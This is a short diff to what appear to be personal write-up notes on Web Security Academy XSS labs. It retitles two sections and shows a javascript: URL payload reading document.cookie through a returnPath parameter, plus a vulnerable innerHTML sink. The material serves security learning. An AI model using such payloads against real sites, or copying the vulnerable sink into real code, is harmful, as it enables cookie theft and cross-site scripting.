@@ -42,14 +42,14 @@ csrf=sPboZoDOXp9ocZN9gfV0LKueKLwMSoCC&postId=2&comment=aaaa&name=ddddd&email=asd
 
 
 
-# DOM XSS in jQuery anchor href attribute sink using location.search source
+# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
 Browse to 'feedback' page, change the url and click back
 ```
 https://acb21f0a1ef32c1381a8b596007000af.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
 ```
 
-# Stored DOM XSS
-In blog post there was a stored XSS, later proccessed by js.
+# Lab: Stored DOM XSS
+There was a stored XSS on the blog-comments page, later proccessed by js.
 The vulnerable code:
 ```javascript
 commentBodyPElement.innerHTML = escapeHTML(comment.body); 
